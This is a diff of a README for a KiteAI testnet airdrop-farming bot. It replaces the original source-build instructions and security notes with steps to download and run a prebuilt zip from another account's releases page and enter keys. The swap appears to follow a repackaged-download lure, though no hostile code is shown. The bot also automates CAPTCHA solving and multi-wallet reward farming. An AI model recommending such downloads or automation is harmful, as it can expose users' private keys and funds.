@@ -1,160 +1,67 @@
-# 🚀 Kite AI Automation-Bot CDY
+# 🤖 Kite-Ai-Automation-Bot - Easily Automate Your GoKite Tasks
 
-**Kite AI Auto-Bot** is a next-gen JavaScript automation tool for interacting with the **KiteAI testnet** ecosystem and its forks (like GoKite, Pharos, Interlink). Perform XP farming, daily rewards, and AI agent chats using multiple wallets — all on autopilot 💼🤖
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ududda/Kite-Ai-Automation-Bot/releases)
 
----
+## 📚 Overview
+Kite AI Automation Bot is a powerful JavaScript tool that automates tasks on the GoKite AI Testnet. With this tool, you can send messages, manage wallets, and rotate proxies effortlessly. It is perfect for anyone working in Web3 who wants to streamline their interactions.
 
-## ✨ Features
+## 🚀 Getting Started
+Follow these steps to download and run the Kite AI Automation Bot. No programming knowledge needed.
 
-* 🧠 **Agent Interactions** 
-  Auto-chat with Professor, Crypto Buddy, and Sherlock using customizable prompts.
+## 📦 System Requirements
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or any Linux distribution.
+- **Node.js:** Version 14 or higher must be installed. [Download Node.js](https://nodejs.org/).
+- **Network:** A stable internet connection for interactions with the GoKite AI Testnet.
 
-* 💧 **Daily Faucet Claim**
-  Automatically solve CAPTCHA and claim daily KITE tokens.
+## 📥 Download & Install
+To get started, visit this page to download: [Kite-Ai-Automation-Bot Releases](https://github.com/ududda/Kite-Ai-Automation-Bot/releases).
 
-* 📈 **Staking Automation**
-  Automatically stake KITE, claim rewards, and track returns.
+### 📂 Step-by-Step Installation
+1. **Open the Link:** Click on the link above to open the GitHub releases page.
+2. **Download the Latest Version:** Scroll to find the latest version and click the file named `KiteAiAutomationBot.zip` to download it.
+3. **Extract the Files:** Once downloaded, locate the `KiteAiAutomationBot.zip` file on your computer. Right-click the file and select "Extract All..." to unzip it. Choose a folder where you'd like to save the contents.
+4. **Navigate to the Folder:** Open the extracted folder. You will see several files, including `index.js` and any required configuration files.
 
-* 👛 **Multi-Wallet Support**
-  Easily manage and rotate between multiple wallets.
+## 🛠️ Running the Software
+### Windows Users
+1. **Open Command Prompt:** Press `Windows + R`, type `cmd`, and hit `Enter`.
+2. **Change Directory:** Type `cd path\to\the\extracted\folder` and press `Enter`. Replace `path\to\the\extracted\folder` with the actual path.
+3. **Run the Bot:** Type `node index.js` and press `Enter` to run the bot.
 
-* 🧮 **Smart Analytics**
-  Monitor XP points, token balances, and staking data in real-time.
+### macOS and Linux Users
+1. **Open Terminal:** You can find Terminal in Applications > Utilities or search for it.
+2. **Change Directory:** Type `cd path/to/the/extracted/folder` and press `Enter`. Replace `path/to/the/extracted/folder` with the actual path.
+3. **Run the Bot:** Type `node index.js` and press `Enter` to start the bot.
 
-* 🕒 **Scheduled Execution**
-  Re-runs itself every 24h with built-in countdown logic.
+## 🔧 Configuring the Bot
+1. **Open Configuration File:** In the extracted folder, find a file called `config.json`. Open it using a text editor (like Notepad for Windows or TextEdit for macOS).
+2. **Set Your API Keys:** You will need to input your API keys for GoKite. Make sure to follow the instructions in the file for correct formatting.
+3. **Save Changes:** After entering the necessary information, save the file.
 
-* 🌐 **Proxy Support** *(Optional)*
-  Supports rotating proxies via `proxy.txt` or `config.json`.
+## ⏩ Using the Automation Features
+You can now start using the automation features. Here are a few tasks you can perform:
+- **Send Messages:** Use the command to send messages easily.
+- **Manage Wallets:** Check balances and create transactions directly.
+- **Rotate Proxies:** Automatically change proxies to optimize connections.
 
----
+## 📞 Support
+If you encounter any issues or have questions, you can create an issue on the GitHub repository. This allows contributors to assist with your problem. Make sure to include details about your setup.
 
-## 📋 Prerequisites
+## 🌟 Key Topics
+Make sure to explore these topics related to Kite AI Automation Bot:
+- airdrop-bot-kite-ai
+- automation
+- crypto
+- javascript
+- web3
 
-Make sure you have:
+## 🌐 Learn More
+Visit the following resources for more information:
+- [Documentation](https://docs.kite.ai)
+- [Community Forums](https://community.kite.ai)
 
-* [Node.js v16+](https://nodejs.org/)
-* At least one Ethereum-compatible private key
-* [2Captcha API key](https://2captcha.com/) *(if using faucet auto-claim)*
-* Access to KiteAI testnet: [testnet.gokite.ai](https://testnet.gokite.ai/?referralCode=ODMG4EWE)
+## 📅 Updates and Changelog
+To keep track of changes and updates, always check the release notes on the GitHub releases page. This will inform you about new features, fixes, and improvements.
 
----
-
-## ⚙️ Installation
-
-1. **Clone the repository**
-
-```bash
-git clone https://github.com/cryptodai3/Kite-Ai-Automation-Bot.git
-```
-```bash
-cd Kite-Ai-Automation-Bot
-```
-
-2. **Install dependencies**
-
-```bash
-npm install
-```
-
-3. **Create environment file**
-
-```bash
-cp .env.example .env
-```
-
-4. **Edit `nano .env`** with your private key(s):
-
-```env
-PRIVATE_KEY_1=your_private_key_here
-PRIVATE_KEY_2=optional_private_key
-```
-
----
-
-## 🚀 Usage
-
-To start the bot:
-
-```bash
-node index.js
-```
-
-What it does:
-
-1. Logs into each wallet
-2. Claims faucet rewards
-3. Stakes tokens & claims rewards
-4. Chats with AI agents
-5. Waits and schedules the next run in 24h
-
----
-
-## 💰 Wallet Setup
-
-1. Get ETH from a testnet faucet
-2. Visit [KiteAI Testnet](https://testnet.gokite.ai/?referralCode=ODMG4EWE)
-3. Claim initial KITE
-4. Stake at least 1 KITE to start earning XP and rewards
-
----
-
-## 🧠 Troubleshooting
-
-* **Invalid private key** – Ensure key starts with `0x`
-* **Captcha not solving** – Check 2Captcha balance/API key
-* **Staking failed** – Make sure you have KITE & testnet ETH
-
----
-
-## 🔒 Security Notes
-
-* Private keys are stored securely in `.env` (never commit this!)
-* Proxy and network handling are sandboxed
-* All interactions are with official Kite endpoints
-* Code is open-source for review and auditing
-
----
-
-## Happy Farming! 🚀🌾
-
-*Brought to you by [CryptoDai3](https://t.me/cryptodai3) X [YetiDAO](https://t.me/YetiDAO)*
-
----
-
-## ☕ Buy Me a Coffee
-
-* **EVM:** `0x49bb35693e9631760d2f3519e7db1dd618580a6a`
-* **TON:** `UQDDYNRWZI12zMfXYBoy300ydECC5uouMUFLd_yZa6ZO4Jsm`
-* **SOL:** `2PhLDFnyX8whHDMBbfGSFoLnVEsei6TYxyiqpDzPGyT1`
-* **SUI:** `0xf3b008f8aac4b92195176aad27a892c565c216fd5c07bc99c70edb8394e23b59`
-
----
-
-## 🔒 Safety & Support
-
-### ⚠️ Important Disclaimer
-
-* **Testnet Only** – This tool is designed for testnet environments only
-* **No Liability** – Use at your own risk. Developers assume no responsibility
-* **DYOR** – Always do your own research before using any automation tools
-
-### 🛡️ Security Best Practices
-
-* 🔐 Never use Main wallets
-* 🚫 Never expose sensitive credentials
-* 📜 Always review code before execution
-* 💸 Use burner wallets with test tokens only
-
----
-
-### 🙌 Support Our Work
-
-Love this tool? Help us improve:
-
-* ⭐ Star the repository
-* 🔗 Share with your farming community
-* 💎 Use our referral codes (where applicable)
-* 💡 Contribute ideas and code
-
----
+Feel free to share your experience with the Kite AI Automation Bot. Your feedback can help enhance the tool further!
